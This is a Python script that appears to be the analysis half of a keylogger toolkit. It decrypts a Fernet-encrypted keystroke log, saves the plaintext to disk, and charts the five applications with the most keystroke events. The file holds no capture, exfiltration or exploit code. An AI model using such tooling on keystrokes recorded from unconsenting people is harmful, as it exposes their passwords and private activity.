import os
from cryptography.fernet import Fernet
import matplotlib.pyplot as plt
import re
from collections import Counter

class LogAnalyzer:
    def __init__(self, key_file="key.key", log_file="keylog.enc"):
        self.key_file = key_file
        self.log_file = log_file

    def decrypt_log(self):
        if not os.path.exists(self.key_file):
            print("[-] Error: Key file not found.")
            return None
        
        if not os.path.exists(self.log_file):
            print("[-] Error: Log file not found.")
            return None

        with open(self.key_file, "rb") as k:
            key = k.read()

        cipher = Fernet(key)

        try:
            with open(self.log_file, "rb") as f:
                encrypted_data = f.read()
            decrypted_data = cipher.decrypt(encrypted_data).decode()
            return decrypted_data
        except Exception as e:
            print(f"[-] Decryption failed: {e}")
            return None

    def analyze_windows(self, data):
        # Extract window titles using Regex
        # Pattern looks for [Window: Title]
        pattern = r"\[Window: (.*?)\]"
        windows = re.findall(pattern, data)
        
        if not windows:
            print("[-] No specific window data found.")
            return

        counter = Counter(windows)
        top_apps = counter.most_common(5)
        
        print("\n[+] Top 5 Applications Used:")
        for app, count in top_apps:
            print(f"    - {app}: {count} keystroke events")

        # Visualizing
        apps = [x[0] for x in top_apps]
        counts = [x[1] for x in top_apps]

        plt.figure(figsize=(10, 6))
        plt.bar(apps, counts, color='skyblue')
        plt.xlabel('Application')
        plt.ylabel('Keystroke Events')
        plt.title('Top 5 Most Used Applications')
        plt.xticks(rotation=45, ha='right')
        plt.tight_layout()
        plt.show()

    def run(self):
        print(f"[*] Decrypting {self.log_file}...")
        data = self.decrypt_log()
        if data:
            print("[+] Decryption successful!")
            # Save decrypted copy
            with open("keylog_decrypted.txt", "w", encoding="utf-8") as f:
                f.write(data)
            print("[+] Saved decrypted log to 'keylog_decrypted.txt'")
            
            print("[*] Analyzing data...")
            self.analyze_windows(data)

if __name__ == "__main__":
    analyzer = LogAnalyzer()
    analyzer.run()
